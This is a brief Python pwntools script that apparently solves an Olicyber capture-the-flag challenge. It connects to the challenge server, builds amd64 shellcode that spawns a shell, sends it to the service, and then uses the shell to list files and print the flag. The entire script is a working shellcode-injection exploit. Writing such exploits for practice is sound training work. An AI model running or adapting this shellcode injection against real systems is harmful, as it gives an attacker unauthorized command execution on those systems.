#!/usr/bin/env python3
from pwn import *
r = remote("software-20.challs.olicyber.it", 13003)
shellcode = asm(pwnlib.shellcraft.amd64.linux.sh(), arch='x86_64')
r.sendlineafter(b'iniziare ...', b'a')
r.recv(100)
r.sendline(str(len(shellcode)).encode())
r.recv(50)
r.sendline(shellcode)
r.recv(50)
r.sendline(b'ls .')
print(r.recv(50))
r.sendline(b'cat flag')
print(r.recv(50))
